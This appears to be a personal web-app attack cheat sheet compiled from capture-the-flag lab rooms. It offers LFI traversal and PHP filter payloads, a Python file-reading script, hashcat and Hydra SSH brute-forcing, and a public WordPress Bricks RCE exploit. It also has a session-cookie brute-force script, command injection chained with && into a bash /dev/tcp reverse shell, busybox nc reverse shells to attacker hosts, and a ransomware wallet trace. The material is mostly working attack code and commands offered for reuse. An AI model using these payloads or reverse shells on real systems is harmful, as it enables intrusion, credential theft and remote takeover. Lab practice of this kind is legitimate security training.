This is a Cheet Sheet for Web App Attack

# Local File Inclusion (LFI)

- http://10.10.143.24/index.php?page=../../../etc/passwd
- http://10.10.143.24/index.php?page=home.html../../../etc/passwd
- http://10.10.143.24/index.php?page=....//....//....//etc/passwd

### PHP wrappers
we can use PHP wrappers, also known as PHP stream wrappers


**php://filter/convert.base64-encode/resource=FILE_PATH**              #we can get the content of a file encoded in base64 using this payload

```
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
```

#### Python script to automate this LFI

```
import requests
import base64

while True :
    file = input("[+]File => ")
    response = requests.get(f'http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource={file}')
    decoded = base64.b64decode(response.text)
    print(decoded.decode('utf-8'))
```

**Output**
```

└─$ python3 LFI.py

[+]File => /etc/passwd

[+]File => /home/blue/.bash_history

[+]File => /home/blue/.reminder
[REDACTED]                     # sup3r_p@s$w0rd!

#In Attacker Machine
└─$ echo '[REDACTED]' > password.txt

└─$ hashcat --stdout password.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

### Hydra
```
└─$ hydra -l blue -P passlist.txt  ssh://10.10.143.24
```

### SSH
```
└─$ ssh blue@10.10.143.24
id
```

---

# Remote Code Execution (RCE) 
CVE-2024–25600 RCE: Remote Code Execution using the CVE-2024–25600 vulnerability in the Bricks WordPress site builder


```
sudo nano /etc/hosts
cat /etc/hosts
wpscan --url https://bricks.thm --disable-tls-checks

```

> wordpress Version: 1.9.5

- [CVE-2024-25600-Bricks-Builder-plugin-for-WordPress](https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress)

or

- [CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE)](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

```
python3 CVE-2024-25600.py -u https://bricks.thm

            # ModuleNotFoundError: No module named 'alive_progress'

pip3 install alive_progress
python3 CVE-2024-25600.py -u https://bricks.thm

        [+] Interactive shell opened successfully

ls
whoami
ls -la
cat 650c844110baced87e1606453b93f22a.txt
```

#### we will see that we have a stable shell access

or

**Gaining a stable connection with the use of pwncat-cs**
> pwncat: pwncat is a post-exploitation platform for Linux targets. It started out as a wrapper around basic bind and reverse shells and has grown from there.
> pwncat used to only support Linux, but there has been a lot of work recently to support multiple platforms. 
- https://github.com/calebstewart/pwncat?tab=readme-ov-file

OR

#### busybox
Running a reverse shell command
```
busybox nc attacker-ip port -e sh
```

**Stable shell gained and flag has been captured**

```
bash -c 'exec bash -i >& /dev/tcp/10.9.1.60/9001 0>&1'

```

> Make sure to run a listener in another terminal to recieve the connection.

```
nc -lnvp 9001 
```

---

# Web exploitation

## Sesssion Hijacking - The Intended Way

>[!NOTE]
> During the enumeration process, we created a test user `user:userpass123` to see what it could do on the platform. In fact, this user has no rights, but we see that a `session cookie` was created for the user after logging in.
> On the first sight, we see that it is `base64` encoded. Decoding it via `[CyberChef](https://gchq.github.io/CyberChef/)` reveals its plaintext structure. It's the name of the user and an `MD5 hash` concatenated with a colon.
```sh
cat .passwords_list.txt 
```

At first I tried to circumvent the rate limiting, which took a lot of time and
led nowhere in the end. The key is the `PHPSESSID` cookie, it looked a bit
suspicious so I tried to decode it for the user I created on the page.

```base64
d2h4OmE4ZjVmMTY3ZjQ0ZjQ5NjRlNmM5OThkZWU4MjcxMTBj
```

decoded to

```
whx:a8f5f167f44f4964e6c998dee827110c
```

That hash looked a lot like an md5 hash, so I compared it to the password I used

```sh
echo -n "asdasd" | md5sum
a8f5f167f44f4964e6c998dee827110c  -
```

After that I created a Python script to hash & encode the cookie before iterating
the list and in this way I got the correct password.

```sh
# session_hijack.py

└─$ nano session_hijack.py
```

```python
import hashlib
import base64
import requests

URL = "http://10.10.16.106/administration.php"

with open ("./ftp/passwords_list.txt", 'r') as _f:
    data = [x.strip() for x in _f.readlines()]

r = requests.get(URL)
page_content = r.text
print(r)

for line in data:
    _hash = hashlib.md5(line.encode('utf-8')).hexdigest().encode('utf-8')
    concat_str = b'admin:' + _hash
    _b64hash = base64.b64encode(concat_str).decode()
    print(_b64hash)
    headers = { "Cookie": f"PHPSESSID={_b64hash}"}
    r = requests.get(URL, headers=headers)
    if len(r.text) > len(page_content):
        print("password: " + line)
        print("cookie: " + _b64hash)
        break
```


```sh
python3 session_hijack.py
```

Results:

![session_hijack.py](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Web%20App%20Attack/Images/session_hijack.py.png)

After login there is a `Service Status Checker` on the administration page. You
can see the status of services/daemons installed on the box of the challenge through
`systemctl status <command>`. My first impression was to just chain commands
through `;` like `ssh
; id`, but that ended in

> Command injection detected, please provide a service.

Most of the commonly used shells have boolean operators like `&&` and `||` as a
condition for the previous exit status code. For example in bash you can check
the status code of the last command that was executed via `echo $?`. That means `&&` is true if the previous command
would return a `0` otherwise `||` is true and the command afterwards will be
executed.
These operators are not blocked by the page, it is possible to chain commands
like this

```sh
sshd && bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
```



Catch the shell via `nc -lvnp 4444` and [upgrade
it](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

> Details:
1. https://github.com/gurkenhabicht/writeups/edit/master/tryhackme/Hijack.md
2. https://0xb0b.gitbook.io/writeups/tryhackme/2023/hijack
3. https://0xdeco.gitbook.io/tryhackme/hijack

---

# Bitcoin Wallet address or LockBit Ransomware Group 
We can see the terms repeating them after a certain point. Since, we are in search for wallet address. I googled for the size of the address:
But the address we have is more than 62. So, I tried splitting them into two parts:

> [!NOTE]
> bitcoin wallet address size
> A bitcoin address is a 26-62 alphanumeric character identifier that is used to receive bitcoin. There are several address formats based on different specifications.


https://gchq.github.io/CyberChef/
1. Iteration — From HEX
2. Iteration — From Base64
3. Iteration — From Base64

### BitCoin address - bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
Searching for the bitcoin address info on blockchain.com

- https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
        OR
- https://blockexplorer.one/bitcoin/mainnet/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
        OR
- https://blockchair.com/bitcoin/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

After searching through various addressees on the transaction list, there is one address that has been sanctioned by various government and official bodies
- https://sanctionssearch.ofac.treas.gov/Details.aspx?id=47682
- https://amlcrypto.io/blog/police_seized_200_lockbit_cryptocurrency_wallets
- https://www.opensanctions.org/entities/ofac-498f813eda6d8a6baf80d86ab72eea73c5dc7efe/
- https://edition.cnn.com/2024/02/19/politics/fbi-ransomware-lockbit-dark-web-site/index.html
- https://ofac.treasury.gov/recent-actions/20240220

  
---


